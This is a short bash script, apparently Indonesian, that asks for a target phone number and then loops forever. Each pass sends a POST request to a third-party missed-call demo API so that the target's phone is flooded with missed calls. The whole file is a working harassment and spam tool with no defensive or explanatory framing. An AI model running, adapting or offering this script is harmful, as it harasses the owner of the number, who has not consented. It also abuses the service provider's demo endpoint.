#!/bin/bash
read -p 'Nomer Target [Example +62896123xxx]: ' nmr
while :;do curl -X POST -d "cid=$nmr&trying=0&spam_delay=10" https://www.citcall.com/demo/misscallapi.php;done
